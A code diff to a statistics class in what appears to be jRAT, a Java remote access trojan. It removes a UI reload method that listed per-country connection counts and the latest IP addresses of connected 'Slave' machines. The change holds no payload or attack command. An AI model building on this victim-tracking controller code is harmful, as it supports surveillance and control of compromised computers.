@@ -11,9 +11,6 @@ import java.util.List;
 
 import pro.jrat.Slave;
 import pro.jrat.io.Files;
-import pro.jrat.ui.frames.Frame;
-import pro.jrat.utils.FlagUtils;
-import pro.jrat.utils.IconUtils;
 
 
 public class Statistics extends AbstractSettings implements Serializable {
@@ -62,7 +59,6 @@ public class Statistics extends AbstractSettings implements Serializable {
 		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
 		list = (ArrayList<StatEntry>) str.readObject();
 		str.close();
-		reload();
 	}
 
 	public void save() throws Exception {
@@ -92,25 +88,6 @@ public class Statistics extends AbstractSettings implements Serializable {
 		}
 		if (!exists) {
 			entry.list.add(0, client.getRawIP());
-		}
-		reload();
-	}
-
-	public void reload() {
-		try {
-			while (Frame.statModel.getRowCount() > 0) {
-				Frame.statModel.removeRow(0);
-			}
-			if (!isTracking()) {
-				return;
-			} 
-			Frame.statModel.addRow(new Object[] { IconUtils.getIcon("all", true), "Total: " + list.size(), "Total: " + getNoConnects(), "Total: " + getDifferentConnects() });
-			for (StatEntry e : list) {
-				String latest = e.list.size() > 0 ? e.list.get(0) : "None";
-				Frame.statModel.addRow(new Object[] { FlagUtils.getFlag(e.country), e.longcountry, e.connects.toString(), e.list.size(), latest });
-			}
-		} catch (Exception ex) {
-			ex.printStackTrace();
 		}
 	}
 
